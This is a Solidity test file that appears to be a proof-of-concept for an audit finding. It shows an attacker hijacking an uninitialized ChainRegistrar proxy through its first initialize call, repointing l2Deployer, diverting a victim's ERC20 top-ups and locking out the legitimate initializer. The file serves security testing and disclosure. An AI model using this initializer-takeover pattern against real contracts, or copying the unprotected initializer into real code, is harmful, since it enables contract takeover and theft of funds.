// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    EraContractsF1SimpleProxy,
    ChainRegistrarLike,
    ChainRegistrarInitAttacker,
    IChainRegistrarLike,
    MockERC20
} from "../src/EraContractsF1ChainRegistrarInitHijackHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for ChainRegistrar initializer takeover and top-up diversion.
contract EraContractsF1ChainRegistrarInitHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_take_owner_via_first_initialize_and_repoint_l2_deployer() public {
        address admin = address(0xA11CE);
        address attackerCollector = address(0xBEEF);

        ChainRegistrarLike implementation = new ChainRegistrarLike();
        EraContractsF1SimpleProxy proxy = new EraContractsF1SimpleProxy(admin);
        IChainRegistrarLike registrar = IChainRegistrarLike(address(proxy));
        ChainRegistrarInitAttacker attacker = new ChainRegistrarInitAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        attacker.hijack(address(proxy), address(0xB0B), address(0xD3E10F), address(attacker));
        attacker.changeDeployer(address(proxy), attackerCollector);

        require(registrar.owner() == address(attacker), "attacker should own chain registrar");
        require(registrar.l2Deployer() == attackerCollector, "attacker should repoint l2Deployer");
    }

    function test_attacker_owned_l2_deployer_receives_proposer_erc20_topups() public {
        address admin = address(0xA11CE);
        address victim = address(0xC0FFEE);
        address attackerCollector = address(0xBEEF);

        ChainRegistrarLike implementation = new ChainRegistrarLike();
        EraContractsF1SimpleProxy proxy = new EraContractsF1SimpleProxy(admin);
        IChainRegistrarLike registrar = IChainRegistrarLike(address(proxy));
        ChainRegistrarInitAttacker attacker = new ChainRegistrarInitAttacker();
        MockERC20 token = new MockERC20();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        attacker.hijack(address(proxy), address(0xB0B), address(0xD3E10F), address(attacker));
        attacker.changeDeployer(address(proxy), attackerCollector);

        token.mint(victim, 100 ether);
        vm.prank(victim);
        token.approve(address(proxy), type(uint256).max);

        vm.prank(victim);
        registrar.proposeChainRegistration(7, address(token), 10, 1);

        require(token.balanceOf(attackerCollector) == 10 ether, "attacker should receive top-up");
        require(token.balanceOf(victim) == 90 ether, "victim should lose top-up amount");
    }

    function test_legitimate_initializer_cannot_recover_after_attacker_first_call() public {
        address admin = address(0xA11CE);

        ChainRegistrarLike implementation = new ChainRegistrarLike();
        EraContractsF1SimpleProxy proxy = new EraContractsF1SimpleProxy(admin);
        IChainRegistrarLike registrar = IChainRegistrarLike(address(proxy));
        ChainRegistrarInitAttacker attacker = new ChainRegistrarInitAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        attacker.hijack(address(proxy), address(0xB0B), address(0xD3E10F), address(attacker));

        vm.prank(admin);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(IChainRegistrarLike.initialize.selector, address(0x111), address(0x222), admin)
        );
        require(!ok, "legitimate initializer should be locked out");
        require(registrar.owner() == address(attacker), "attacker ownership should persist");
    }
}
